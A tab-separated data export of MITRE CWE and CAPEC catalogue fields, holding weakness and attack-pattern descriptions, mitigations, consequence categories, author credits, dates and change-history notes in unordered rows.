16888	35	MITRE
9608	28	CWE Content Team
20599	27	If the content is to be modified in transit, the adversary requires a tool capable of intercepting the target's communication and generating/creating custom packets to impact the communications.                In some variants, the targeted content is altered so that all or some of it is redirected towards content published by the attacker (for example, images and frames in the target's web site might be modified to be loaded from a source controlled by the attacker). In these cases, the attacker requires the necessary resources to host the replacement content.
20096	40	SOAP messages are used as a communication mechanism in the system
12175	50	Implementation: Keep software patched to ensure that known vulnerabilities are not available for attackers to target on host.
9708	28	CWE Content Team
23774	62	updated Applicable_Platforms, Description, Relationships, Taxonomy_Mappings
18278	63	Gain Privileges or Assume Identity
20332	56	ChildOf
18713	23	The software stores sensitive information in a file system or device that does not have built-in access control.
18793	97	Configuration/Environment Manipulation
8336	62	updated Demonstrative_Examples, Relationships
12633	31	1000
5615	103	Primary
10967	62	updated Potential_Mitigations, Time_of_Introduction
12717	21	CWE Content Team
7747	62	updated Other_Notes, Potential_Mitigations
20797	56	ChildOf
8179	62	Defined several different subtypes of this issue.
10888	62	updated Applicable_Platforms, Common_Consequences, Detection_Factors, Potential_Mitigations, Related_Attack_Patterns, Relationships, Taxonomy_Mappings
20261	95	Having determined the information stored in the user state and the possible ways to modify it, the adversary can violate it in order to perform illegitimate actions.
9598	63	Read Files or Directories
5717	104	1109
15897	62	updated Alternate_Terms, Background_Details, Common_Consequences, Relationships, Relevant_Properties, Taxonomy_Mappings
25077	28	CWE Content Team
9006	90	Language-Independent
7457	28	CWE Content Team
9272	62	updated Modes_of_Introduction, References, Relationships
21991	92	Experiment
23753	42	Ensure that the checksums present in messages are properly checked in accordance with the protocol specification before they are parsed and used.
12938	51	2017-02-06
23241	39	2014-01-22
20406	53	The MITRE Corporation
9765	62	updated Applicable_Platforms, Maintenance_Notes, Relationships, Taxonomy_Mappings, Type
24641	66	An overview of common programming security vulnerabilities and possible solutions
21388	76	2018-07-31
17287	94	Attacks that leverage the principle of scarcity can lead to the target performing an action that results in a variety of consequences that negatively affect the confidentiality, availability, and/or integrity of an application or system.
20155	31	1000
10780	86	https://w3c.github.io/webappsec-csp/
10817	62	updated Relationships, Taxonomy_Mappings
18038	91	Operation
13957	35	MITRE
20334	28	CWE Content Team
21657	45	Class
25427	39	2014-06-23
14846	28	CWE Content Team
22805	62	updated Relationships, Other_Notes
7999	94	A successful Stored XSS attack can enable an adversary run arbitrary code of their choosing, thus enabling a complete compromise of the application.
18743	23	The product does not handle or incorrectly handles a file name that identifies a "virtual" resource that is not directly specified within the directory that is associated with the file name, causing the product to perform file-based operations on a resource that is not a file.
24599	62	updated Potential_Mitigations
10511	39	2019-01-03
5880	35	MITRE
18029	35	Cigital
7129	28	CWE Content Team
17208	46	In most cases a direct call to a Thread object's run() method is a bug. The programmer intended to begin a new thread of control, but accidentally called run() instead of start(), so the run() method will execute in the caller's thread of control.
23571	62	updated Relationships
13505	62	updated Relationships
10946	23	An adversary attacks a system by bypassing some or all functionality intended to protect it. Often, a system user will think that protection is in place, but the functionality behind those protections has been disabled by the adversary.
24548	35	MITRE
15559	74	3
6203	26	Operation
20748	86	http://blogs.technet.com/swi/archive/2008/03/11/the-case-of-the-uninitialized-stack-variable-vulnerability.aspx
12010	62	updated Related_Attack_Patterns, Relationships
19365	35	MITRE
7580	42	Do not use "forgotten password" functionality. But if you must, ensure that you are only providing information to the actual user, e.g. by using an email address or challenge question that the legitimate user already provided in the past; do not allow the current user to change this identity information until the correct password has been provided.
12148	97	Schema Poisoning
16745	39	2017-01-19
12750	28	CWE Content Team
13665	35	Cigital
22299	35	MITRE
5756	95	[Content spoofing] By manipulating the content, the attacker targets the information that the user would like to get from the website.
8209	28	CWE Content Team
8831	56	ChildOf
8177	50	To mitigate this type of an attack, an application that may display sensitive information should clear the screen contents before a screenshot is taken. This can be accomplished by setting the key window's hidden property to YES. This code to hide the contents should be placed in both the applicationWillResignActive() and applicationDidEnterBackground() methods.
14802	100	The MITRE Corporation
12565	81	Non-Repudiation
23821	28	CWE Content Team
12196	44	Moderate
21665	103	Primary
9947	103	Primary
13897	39	2012-05-11
10349	62	updated Other_Notes
5917	39	2010-02-16
17727	63	Quality Degradation
21771	62	updated Relationships, Taxonomy_Mappings
11499	23	Many languages use code signing facilities to vouch for code's identity and to thus tie code to its assigned privileges within an environment. Subverting this mechanism can be instrumental in an attacker escalating privilege. Any means of subverting the way that a virtual machine enforces code signing classifies for this style of attack.
19613	101	CAPEC Content Team
13587	74	4
6337	45	Base
16407	81	Availability
20681	35	MITRE
17557	35	MITRE
17099	62	updated Time_of_Introduction
17526	62	updated Potential_Mitigations, Time_of_Introduction
21894	42	Do not perform resource-intensive transactions for unauthenticated users and/or invalid requests.
8501	80	Spear phishing attacks require specific knowledge of the victims being targeted, such as which bank is being used by the victims, or websites they commonly log into (Google, Facebook, etc).
17424	62	updated Potential_Mitigations
21803	103	Primary
20079	103	Primary
14138	74	1
11574	56	ChildOf
14792	76	2018-07-31
15506	100	The MITRE Corporation
11445	28	CWE Content Team
5818	56	ChildOf
18749	39	2012-05-11
15908	35	MITRE
8743	47	Gain Privileges
22962	23	The program uses an expression in which operator precedence causes incorrect logic to be used.
8625	62	updated Applicable_Platforms, Common_Consequences, Relationships, Other_Notes, Taxonomy_Mappings
22106	33	Robert A. Martin
21720	39	2013-02-21
10463	97	Compromising Emanations Attack
8189	62	updated Common_Consequences
14650	62	updated Time_of_Introduction
14132	21	PLOVER
14466	35	MITRE
13992	50	Implement a password throttling mechanism. This mechanism should take into account both the IP address and the log in name of the user.
7592	70	Satellite Jamming in Iran: A War over Airwaves
14515	91	Implementation
15799	35	MITRE
5784	89	Standard
22657	104	1065
16305	46	Incomplete filtering of this nature may be location-dependent, as in only the first or last element is filtered.
16789	40	The victim must be made to execute a query crafted by the attacker which results in the infected error report.
23628	88	Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
7290	39	2019-01-03
12598	23	An attacker exploits a weakness in the parsing or display code of the recipient software to generate a data blob containing a supposedly valid signature, but the signer's identity is falsely represented, which can lead to the attacker manipulating the recipient software or its victim user to perform compromising actions.
23307	28	CWE Content Team
18405	62	updated Description
20686	35	MITRE
16935	79	Authentication
13363	39	2010-04-05
9102	42	When freeing pointers, be sure to set them to NULL once they are freed. However, the utilization of multiple or complex data structures may lower the usefulness of this strategy.
24030	56	ChildOf
22920	34	OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.
14371	31	1003
13322	46	Documentation may need to cover error handling techniques at multiple layers, such as module, executable, compilable code unit, or callable.
16452	39	2010-02-16
8363	91	Operation
24740	62	updated Taxonomy_Mappings
13319	28	CWE Content Team
10671	92	Exploit
10273	27	None: No specialized resources are required to execute this type of attack. In some cases, the attacker may need special client applications in order to execute the reset functionality.
15319	62	updated Applicable_Platforms, Taxonomy_Mappings
19893	91	Implementation
7542	54	Low
16089	62	updated Description, Name
14681	28	CWE Content Team
12148	61	Draft
21146	39	2014-07-30
13577	39	2017-11-08
10486	35	MITRE
20898	39	2012-05-11
16248	60	23
22548	78	Very High
11713	103	Primary
22569	94	By altering specific configuration settings for the service, the adversary could run arbitrary code to be executed.
23448	62	updated Description, Relationships, Other_Notes
11236	23	The software contains an expression that will always evaluate to true.
14454	43	Simple
19750	61	Draft
24940	23	The program contains a code sequence that can run concurrently with other code, and the code sequence requires temporary, exclusive access to a shared resource, but a timing window exists in which the shared resource can be modified by another code sequence that is operating concurrently.
18707	45	Base
19810	81	Access Control
23866	54	Low
22943	42	Properly validate user input. Reject data where appropriate, filter where appropriate and escape where appropriate. Make sure input that will be used in XPath queries is safe in that context.
25066	62	updated References, Relationships
21483	39	2009-03-10
23568	86	http://www.blackhat.com/presentations/bh-europe-01/halvar-flake/bh-europe-01-halvarflake.ppt
18779	69	Draft
17149	39	2012-05-11
24783	26	Implementation
8865	39	2008-09-08
10012	45	Base
12344	22	02
14411	54	Low
21223	28	CWE Content Team
15001	76	2017-08-04
18292	86	http://www.ibm.com/developerworks/library/l-openssl2/index.html
21230	102	ChildOf
13903	91	Architecture and Design
19117	35	MITRE
20857	60	06
18420	35	MITRE
21849	28	CWE Content Team
13013	92	Exploit
15692	46	This could allow an attacker to use an invalid certificate to claim to be a trusted host, use expired certificates, or conduct other attacks that could be detected if the certificate is properly validated.
16891	28	CWE Content Team
7807	56	ChildOf
10789	66	Security Tips
23709	39	2011-06-27
11745	102	ChildOf
21052	35	MITRE
11507	35	MITRE
25296	62	updated Relationships, Taxonomy_Mappings
24147	21	Evgeny Lebanidze
6118	47	Modify Data
8090	63	Execute Unauthorized Code or Commands
12754	62	updated Time_of_Introduction
16433	35	MITRE
8024	92	Exploit
17833	35	MITRE
12869	43	Simple
16349	100	The MITRE Corporation
8796	47	Other
15492	39	2009-05-27
19379	62	updated Common_Consequences, Relationships
9207	91	Implementation
14546	31	699
8180	35	MITRE
13571	26	Implementation
23670	35	MITRE
15859	33	Jason Lam
15042	50	Design: Use input validation for cookies
6463	76	2017-08-04
8976	28	CWE Content Team
5926	86	http://ftp.cerias.purdue.edu/pub/papers/taimur-aslam/aslam-taxonomy-msthesis.pdf
19239	101	CAPEC Content Team
14509	39	2008-07-01
6355	28	CWE Content Team
12689	31	1000
16114	91	Architecture and Design
8469	31	1000
10377	76	2017-08-04
12936	78	Medium
19669	39	2009-12-28
15572	28	CWE Content Team
21308	28	CWE Content Team
9356	100	The MITRE Corporation
14175	27	The Attacker needs the ability to control source code or application configuration responsible for selecting which message/channel id is absorbed from the public distribution means.
20855	56	ChildOf
24079	85	212
20556	39	2009-07-27
6557	35	MITRE
21916	43	Simple
23499	35	MITRE
9536	39	2019-06-20
9598	81	Confidentiality
11060	28	CWE Content Team
12758	88	Improper Neutralization of Whitespace
15397	62	updated Related_Attack_Patterns, Relationships
25276	35	MITRE
11289	88	Struts: Non-private Field in ActionForm Class
13447	61	Draft
23268	35	MITRE
17732	104	403
6112	104	501
8609	26	Build and Compilation
13588	39	2011-06-01
8986	62	updated Relationships
17375	35	Cigital
17712	47	Bypass Protection Mechanism
17092	39	2012-10-30
8073	39	2010-06-21
19508	39	2012-05-11
8374	62	updated Common_Consequences
14160	39	2012-05-11
22092	104	1094
16593	62	updated Common_Consequences
18186	39	2012-05-11
7605	76	2015-12-07
17107	85	291
6614	62	updated Alternate_Terms, Common_Consequences, Relationships, Other_Notes, Weakness_Ordinalities
6427	62	updated Alternate_Terms, Description, Maintenance_Notes, Name, Other_Notes, Relationships
9389	63	Read Memory
17936	35	MITRE
9001	76	2019-04-04
17741	62	updated Time_of_Introduction
16158	103	Primary
23279	80	The attacker need inject values into the global parameters to the Flash file and understand the parent HTML document DOM structure. The attacker need be smart enough to convince the victim to his crafted link.
19874	57	Primary
9238	67	High
10814	45	Variant
9712	81	Other
10792	35	Cigital
15885	35	MITRE
10280	73	The adversary compares this result to a database of known TCP timestamp increments for a possible match.
7476	26	Architecture and Design
10124	66	HTTP Request Smuggling
24839	31	1003
17175	52	Omission of a break statement might be intentional, in order to support fallthrough. Automated detection methods might therefore be erroneous. Semantic understanding of expected program behavior is required to interpret whether the code is correct.
9194	62	updated Common_Consequences, Detection_Factors, Potential_Mitigations, References, Relationships
18461	73	Use a web application debugging tool such as Tamper Data, TamperIE, WebScarab,etc. to modify HTTP POST parameters, hidden fields, non-freeform fields, etc.
12074	59	Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Methods_of_Attack, Resources_Required, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit, Typical_Severity
20377	76	2017-08-04
11897	78	Very High
9063	39	2014-07-30
17969	79	Integrity
24888	28	CWE Content Team
7082	28	CWE Content Team
13752	81	Confidentiality
21964	33	Eugene H. Spafford
17607	28	CWE Content Team
11951	80	Adversaries can purchase and implement rogue BTS stations at a cost effective rate, and can push a mobile device to downgrade to a non-secure cellular protocol like 2G over GSM or CDMA.
8971	102	ChildOf
10009	35	MITRE
7248	62	updated Potential_Mitigations
8333	36	http://projects.webappsec.org/w/page/13246956/Routing-Detour
14172	35	MITRE
25156	35	MITRE
19403	28	CWE Content Team
8738	85	482
17677	103	Primary
20286	28	CWE Content Team
23019	35	MITRE
24732	42	While it is risky to use dynamically-generated query strings, code, or commands that mix control and data together, sometimes it may be unavoidable. Properly quote arguments and escape any special characters within those arguments. The most conservative approach is to escape or filter all characters that do not pass an extremely strict whitelist (such as everything that is not alphanumeric or white space). If some special characters are still needed, such as white space, wrap each argument in quotes after the escaping/filtering step. Be careful of argument injection (CWE-88).
19130	39	2008-10-14
21362	39	2008-09-08
22152	39	2009-10-29
13044	62	updated Description, Relationships, Other_Notes, Taxonomy_Mappings
21667	44	Limited
13652	35	MITRE
6389	39	2012-05-11
6412	53	The MITRE Corporation
13480	51	2014-06-23
18201	28	CWE Content Team
6367	42	Combine use of blacklist with appropriate use of whitelists.
14233	31	1000
6480	62	updated Potential_Mitigations
20513	62	updated Description, Relationships, Taxonomy_Mappings
6867	28	CWE Content Team
21855	28	CWE Content Team
6030	43	Simple
6016	62	updated Relationships, Taxonomy_Mappings, Type
14993	91	System Configuration
22997	63	Varies by Context
22009	45	Variant
8104	62	updated Potential_Mitigations
10891	43	Simple
10312	91	Architecture and Design
24419	80	A brute force attack is very straightforward. A variety of password cracking tools are widely available.
21002	28	CWE Content Team
24690	28	CWE Content Team
13971	39	2019-01-03
18787	88	Loop Condition Value Update within the Loop
15189	28	CWE Content Team
7831	39	2009-10-29
24633	35	MITRE
21205	73	Use a proxy tool to record all links visited during a manual traversal of attempts on well-known URLs.
20658	31	1000
22980	62	updated Common_Consequences
17513	72	An attacker that can influence the allocation of resources that are not properly released could deplete the available resource pool and prevent all other processes from accessing the same type of resource.
21547	39	2011-06-01
10500	42	Client side tokens/parameters should not be such that it would be easy/predictable to guess another valid state.
11063	28	CWE Content Team
7603	35	Cigital
18785	39	2012-05-11
23179	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
17034	97	WebView Exposure
6633	55	CAPEC Content Team
23134	79	Integrity
7139	42	Use and specify an output encoding that can be handled by the downstream component that is reading the output. Common encodings include ISO-8859-1, UTF-7, and UTF-8. When an encoding is not specified, a downstream component may choose a different encoding, either by assuming a default encoding or automatically inferring which encoding is being used, which can be erroneous. When the encodings are inconsistent, the downstream component might treat some character or byte sequences as special, even if they are not special in the original encoding. Attackers might then be able to exploit this discrepancy and conduct injection attacks; they even might be able to bypass protection mechanisms that assume the original encoding is also being used by the downstream component.
8637	23	The software does not restrict or incorrectly restricts operations within the boundaries of a resource that is accessed using an index or pointer, such as memory or files.
9494	39	2014-07-30
20106	52	This typically occurs in rarely-triggered error conditions, reducing the chances of detection during black box testing.
20310	35	MITRE
20601	39	2010-02-16
22220	28	CWE Content Team
11007	62	updated Time_of_Introduction
18271	62	updated Modes_of_Introduction, Other_Notes
20776	79	Integrity
5769	39	2014-07-30
18409	47	Modify Data
20295	88	Improper Resource Shutdown or Release
9656	26	Implementation
10497	62	updated Potential_Mitigations, Relationships
15609	26	Architecture and Design
18147	26	Implementation
17467	28	CWE Content Team
19123	85	63
10451	47	Gain Privileges
20484	28	Eric Dalci
20939	27	The adversary must be able to identify the weakness in the utilized protocol and exploit it. This may require a sniffing tool as well as packet creation abilities. The adversary will be aided if they can force the client and/or server to utilize a specific protocol known to contain exploitable weaknesses.
9530	81	Authorization
8613	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
18179	81	Integrity
7469	81	Availability
11945	39	2008-08-15
22126	103	Primary
19772	39	2019-06-20
11779	91	Implementation
13186	31	1000
13221	76	2019-09-30
16163	74	5
11511	44	High
21540	27	None: No specialized resources are required to execute this type of attack.
16658	35	MITRE
6915	56	ChildOf
13073	43	Simple
13293	46	When a primitive is cast to a smaller primitive, the high order bits of the large value are lost in the conversion, potentially resulting in an unexpected value that is not equal to the original value. This value may be required as an index into a buffer, a loop iterator, or simply necessary state data. In any case, the value cannot be trusted and the system will be in an undefined state. While this method may be employed viably to isolate the low bits of a value, this usage is rare, and truncation usually implies that an implementation error has occurred.
25262	28	CWE Content Team
12595	23	The product does not sufficiently protect all possible paths that a user can take to access restricted functionality or resources.
21604	62	updated Likelihood_of_Exploit, Modes_of_Introduction, Relationships, Taxonomy_Mappings
16907	90	Language-Independent
5823	62	updated Relationships, Other_Notes, Taxonomy_Mappings
13621	95	[Determine application's/system's password policy] Determine the password policies of the target application/system.
17266	33	Scott A. Vanstone
25278	104	367
8795	62	updated Relationships, Taxonomy_Mappings
15660	62	Suggested OWASP Top Ten 2004 mapping
14755	81	Integrity
19517	96	2009-05-13
7749	69	Incomplete
17736	25	High
18479	33	Object Management Group (OMG)
11891	31	699
19371	39	2009-10-29
10878	79	Integrity
14963	28	CWE Content Team
23409	35	MITRE
5635	35	MITRE
18887	43	Simple
7863	62	updated Relationships, White_Box_Definitions
23939	72	Attackers can leverage the additional information they gain from debugging output to mount attacks targeted on the framework, database, or other resources used by the application.
18382	101	CAPEC Content Team
22147	101	CAPEC Content Team
8653	33	Elliotte Rusty Harold
22286	50	Canonicalize all data prior to validation.
8870	35	Cigital
24109	28	CWE Content Team
7170	31	1000
10121	40	Server software must rely on weak session IDs proof and/or verification schemes
12447	35	MITRE
22841	23	The software accesses a data resource through a database without using a      connection pooling capability.
20159	39	2019-06-20
8012	35	MITRE
22613	62	updated References
23464	35	MITRE
13447	40	The attacker must be able to modify the value stored in a cache to match a desired value.
22666	28	Eric Dalci
5679	69	Incomplete
16472	35	MITRE
7505	74	2
17681	55	CAPEC Content Team
13597	102	ChildOf
18146	63	Bypass Protection Mechanism
6255	39	2011-06-27
20505	28	Eric Dalci
22847	62	updated Causal_Nature, Relationships
17285	39	2017-11-08
11768	103	Primary
13880	45	Base
17357	31	1000
22476	79	Availability
19094	81	Access Control
6779	26	Architecture and Design
22967	63	Bypass Protection Mechanism
16080	91	Architecture and Design
6025	39	2019-06-20
22117	62	updated Relationships, Taxonomy_Mappings
9088	45	Variant
11325	31	1003
16742	81	Other
17575	35	MITRE
5937	56	ChildOf
16502	101	CAPEC Content Team
23891	35	MITRE
19474	62	updated Potential_Mitigations
7824	28	CWE Content Team
8651	42	Create a strategy for presenting information, and plan for how to display unusual characters.
12625	28	CWE Content Team
12075	81	Integrity
19542	28	CWE Content Team
10945	81	Other
16666	101	CAPEC Content Team
13868	28	CWE Content Team
7225	39	2011-06-01
13575	39	2012-10-30
15654	39	2008-09-08
19224	28	CWE Content Team
7881	35	Cigital
5741	35	MITRE
13134	54	Medium
24214	39	2019-06-20
10143	28	CWE Content Team
10279	47	Gain Privileges
12253	56	ChildOf
23261	21	PLOVER
14922	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
16930	62	updated Relationships
21285	104	922
7390	33	Daniel Gruss
22661	42	Ensure that passwords are stored safely and are not reversible.
25432	56	ChildOf
7089	31	1000
20191	42	While it is risky to use dynamically-generated query strings, code, or commands that mix control and data together, sometimes it may be unavoidable. Properly quote arguments and escape any special characters within those arguments. The most conservative approach is to escape or filter all characters that do not pass an extremely strict whitelist (such as everything that is not alphanumeric or white space). If some special characters are still needed, such as white space, wrap each argument in quotes after the escaping/filtering step. Be careful of argument injection (CWE-88).
16369	81	Integrity
22579	35	MITRE
5850	35	MITRE
19631	39	2012-10-30
20046	96	2010-12-12
8632	28	CWE Content Team
20106	77	Black Box
22248	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Formal Methods / Correct-By-Construction                                                                     Cost effective for partial coverage:                                                                           Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)
8711	26	Implementation
10772	62	updated Potential_Mitigations
13045	53	The MITRE Corporation
11261	28	CWE Content Team
20445	39	2008-07-01
23201	89	Detailed
23561	63	DoS: Resource Consumption (CPU)
20814	97	Collect Data from Clipboard
7154	35	MITRE
8282	76	2017-08-04
21719	62	updated Observed_Examples
19928	102	ChildOf
21905	80	Able to develop and manufacture malicious system components that perform the same functions and processes as their non-malicious counterparts.
14771	39	2011-06-01
8497	24	MITRE
10472	35	Cigital
10749	63	Modify Application Data
17851	46	This issue makes it more difficult to maintain the software, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.
19592	62	updated Applicable_Platforms
6732	52	Specialized configuration or tuning may be required to train automated tools to recognize this weakness.                   Automated static analysis typically has limited utility in recognizing unlimited allocation problems, except for the missing release of program-independent system resources such as files, sockets, and processes, or unchecked arguments to memory. For system resources, automated static analysis may be able to detect circumstances in which resources are not released after they have expired, or if too much of a resource is requested at once, as can occur with memory. Automated analysis of configuration files may be able to detect settings that do not specify a maximum value.                   Automated static analysis tools will not be appropriate for detecting exhaustion of custom resources, such as an intended security policy in which a bulletin board user is only allowed to make a limited number of posts per day.
8935	28	CWE Content Team
8338	35	MITRE
21558	62	updated Description, Relationships
22347	31	1000
19434	35	MITRE
17204	97	Fingerprinting
17002	28	CWE Content Team
24790	33	Alma Whitten
8830	63	Modify Application Data
24145	43	Simple
12041	81	Access Control
16167	39	2011-06-01
10703	39	2008-09-08
6166	28	CWE Content Team
6431	35	MITRE
18753	55	CAPEC Content Team
16117	42	Implement error handling around the JNI call.
16450	39	2008-09-08
22426	28	CWE Content Team
23207	62	updated Demonstrative_Examples, Relationships
6063	62	updated Demonstrative_Examples, Potential_Mitigations, References, Related_Attack_Patterns, Relationships
23924	35	MITRE
6050	91	Architecture and Design
11018	90	Language-Independent
8923	62	updated Demonstrative_Examples
14845	28	CWE Content Team
9041	81	Confidentiality
13427	39	2009-05-27
6368	81	Access Control
14241	100	The MITRE Corporation
10928	28	CWE Content Team
15792	35	Cigital
7437	72	An attacker can trick a user into performing actions that are masked and hidden from the user's view. The impact varies widely, depending on the functionality of the underlying application. For example, in a social media application, clickjacking could be used to trik the user into changing privacy settings.
14810	35	MITRE
21661	66	Second-Order Symlink Vulnerabilities
7357	62	updated Potential_Mitigations
21430	62	updated Causal_Nature, Relationships
7149	72	If the attacker is able to include a crafted DTD and a default entity resolver is enabled, the attacker may be able to access arbitrary files on the system.
18903	28	CWE Content Team
8699	35	MITRE
12557	39	2011-06-01
19786	79	Availability
21761	31	1000
7579	28	CWE Content Team
18850	28	CWE Content Team
11471	62	updated Related_Attack_Patterns, Relationships, Type
20134	39	2011-06-01
19240	76	2019-04-04
17039	69	Draft
10229	28	CWE Content Team
16346	35	MITRE
8295	34	OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.
24427	61	Draft
23029	90	Language-Independent
18418	26	Implementation
5676	39	2012-10-30
22617	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
20111	62	updated Relationships, Taxonomy_Mappings
15657	35	MITRE
8655	90	Java
23938	67	Medium
12088	39	2015-12-07
7987	42	Run or compile the software using features or extensions that automatically provide a protection mechanism that mitigates or eliminates buffer overflows.                   For example, certain compilers and extensions provide automatic buffer overflow detection mechanisms that are built into the compiled code. Examples include the Microsoft Visual Studio /GS flag, Fedora/Red Hat FORTIFY_SOURCE GCC flag, StackGuard, and ProPolice.
21837	62	updated Relationships
9782	62	updated Taxonomy_Mappings
17004	69	Incomplete
7701	59	Updated Related_Attack_Patterns
24119	35	Cigital
22697	63	Gain Privileges or Assume Identity
14254	51	2015-11-09
19193	62	updated Potential_Mitigations
9721	62	Improved the White_Box_Definition
17167	39	2011-06-01
17457	88	Improper Locking
25198	66	Blacklist defenses as a breeding ground for vulnerability variants
9528	28	CWE Content Team
5692	56	ChildOf
10819	35	MITRE
22358	91	Implementation
10384	85	87
10543	48	09
24184	28	CWE Content Team
13895	28	CWE Content Team
11931	30	Chris Evans
13461	39	2008-11-24
19977	69	Draft
13340	73	Redirecting Web traffic to a site that looks enough like the original so as to not raise any suspicion.
22386	62	updated Potential_Mitigations, Time_of_Introduction
16192	39	2014-02-18
13878	62	updated Relationships, Taxonomy_Mappings
5865	50	Implementation: remove sensitive information such as user name and password in the SWF file.
8111	62	updated Potential_Mitigations
17436	28	CWE Content Team
24127	63	Read Application Data
20189	46	This issue can prevent the software from running reliably, e.g. by making the instantion process non-thread-safe and introducing deadlock (CWE-833) or livelock conditions.  If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.
12259	40	The adversary must have the means and knowledge of how to communicate with the target in some manner.
23561	72	The DTD may cause the parser to consume excessive CPU cycles or memory using techniques such as nested or recursive entity references (CWE-776).
18852	74	1
13451	28	CWE Content Team
19279	39	2008-09-08
8074	28	CWE Content Team
18788	50	Hard Coded Alternate DNS server in applications                Avoid dependence on DNS                Include "hosts file"/IP address in the application                Ensure best practices with respect to communications channel protections.                Use a .onion domain with Tor support
16576	39	2017-11-08
14205	95	[Session Hijacking] The attacker decides to target the web server by crafting a malicious HTTP Request containing a second HTTP Request using syntax that will not be processed and acted on by an outer "filter" parsing layer but will be acted on by the inner web server/application processing layers. The application/web server will then act on the malicious HTTP Request as if it is a valid request from the client potentially subverting session management.
10603	43	Simple
18033	100	The MITRE Corporation
18101	35	MITRE
15270	35	MITRE
6123	69	Draft
22962	90	Language-Independent
16690	55	CAPEC Content Team
12941	61	Draft
24943	28	CWE Content Team
24972	59	Updated Related_Attack_Patterns
18260	100	The MITRE Corporation
13481	39	2017-11-08
23915	97	XML Entity Linking
23187	39	2009-10-29
7447	39	2014-07-30
11000	21	PLOVER
21791	62	updated Relationships
25204	21	PLOVER
23033	31	699
19814	39	2019-06-20
6372	74	2
9356	59	Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Typical_Likelihood_of_Exploit, Typical_Severity
6024	44	SOAR Partial
8079	28	CWE Content Team
24603	43	Simple
24182	28	CWE Content Team
23528	43	Simple
22154	79	Access Control
20278	74	3
19159	62	updated Applicable_Platforms, Common_Consequences, Description, Relationships
24966	62	updated Demonstrative_Examples, Related_Attack_Patterns, Relationships
18580	31	1000
22328	50	Introducing a random nonce with each new connection ensures that the attacker cannot employ two connections to attack the authentication protocol
19051	81	Integrity
9550	62	updated Alternate_Terms, Applicable_Platforms, Description, Maintenance_Notes, Name, Observed_Examples, References, Relationship_Notes, Relationships, Theoretical_Notes, Type
11088	35	MITRE
6787	35	MITRE
10961	28	CWE Content Team
12851	45	Variant
22849	28	CWE Content Team
25440	31	1000
11458	39	2019-09-19
11511	75	These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules.
24745	35	MITRE
14060	28	CWE Content Team
13882	100	The MITRE Corporation
24397	42	Mitigating technologies such as safe string libraries and container abstractions could be introduced.
15202	56	ChildOf
12487	35	MITRE
22877	39	2019-06-20
19210	39	2010-12-13
23164	39	2008-07-01
5612	91	Implementation
15452	35	MITRE
22296	79	Authorization
21064	91	Architecture and Design
15307	63	Bypass Protection Mechanism
6913	28	CWE Content Team
23350	101	CAPEC Content Team
17099	39	2008-07-01
20394	105	Mobile
16327	90	Language-Independent
9596	62	updated Applicable_Platforms, Demonstrative_Examples, Modes_of_Introduction, Relationships
7526	44	SOAR Partial
5698	28	CWE Content Team
20717	35	Cigital
22692	39	2008-07-01
17701	35	MITRE
23481	39	2011-03-29
12191	91	Implementation
16035	42	For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.                   Even though client-side checks provide minimal benefits with respect to server-side security, they are still useful. First, they can support intrusion detection. If the server receives input that should have been rejected by the client, then it may be an indication of an attack. Second, client-side error-checking can provide helpful feedback to the user about the expectations for valid input. Third, there may be a reduction in server-side processing time for accidental input errors, although this is typically a small savings.
22286	50	Perform white list rather than black list input validation.
17911	91	Installation
12233	40	The target application must use a parameter encoding where separators and parameter identifiers are expressed in regular text.
6318	59	Updated References
22821	71	2014
16571	39	2008-09-08
6423	26	Architecture and Design
24509	28	CWE Content Team
17491	25	Medium
23042	40	Authentication tokens / secrets are shared between the server and the legitimate client
9139	28	CWE Content Team
14528	42	Use tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session. These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules.
21657	46	Certain languages allow direct addressing of memory locations and do not automatically ensure that these locations are valid for the memory buffer that is being referenced. This can cause read or write operations to be performed on memory locations that may be associated with other variables, data structures, or internal program data.             As a result, an attacker may be able to execute arbitrary code, alter the intended control flow, read sensitive information, or cause the system to crash.
22010	28	CWE Content Team
15404	35	MITRE
18302	86	https://arxiv.org/abs/1801.01944
20655	35	MITRE
15999	33	Robert Auger
14875	91	Implementation
19602	48	02
6017	35	MITRE
7029	39	2008-08-15
14229	35	MITRE
15684	92	Explore
24572	85	485
22713	56	Requires
16861	28	CWE Content Team
17605	104	382
21831	28	CWE Content Team
17658	55	CAPEC Content Team
14375	72	The user may be subjected to phishing attacks by being redirected to an untrusted page. The phishing attack may point to an attacker controlled web page that appears to be a trusted web site. The phishers may then steal the user's credentials and then use these credentials to access the legitimate web site.
8020	28	CWE Content Team
6390	89	Detailed
23672	28	Eric Dalci
12320	26	Implementation
23341	86	https://en.wikipedia.org/wiki/Encapsulation_(computer_programming)
19957	39	2012-05-11
7301	39	2008-07-01
19753	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Manual Source Code Review (not inspections)                                                                     Cost effective for partial coverage:                                                                           Focused Manual Spotcheck - Focused manual analysis of source
5920	39	2017-11-08
23131	62	updated Relationships
23347	63	Modify Files or Directories
8655	90	C#
15586	92	Explore
8494	39	2008-10-14
11899	35	MITRE
8277	63	Bypass Protection Mechanism
18142	63	Other
19625	31	1000
16566	62	updated Applicable_Platforms, Common_Consequences, Demonstrative_Examples, Description, Likelihood_of_Exploit, Name, Observed_Examples, Other_Notes, Potential_Mitigations, References, Relationship_Notes, Relationships
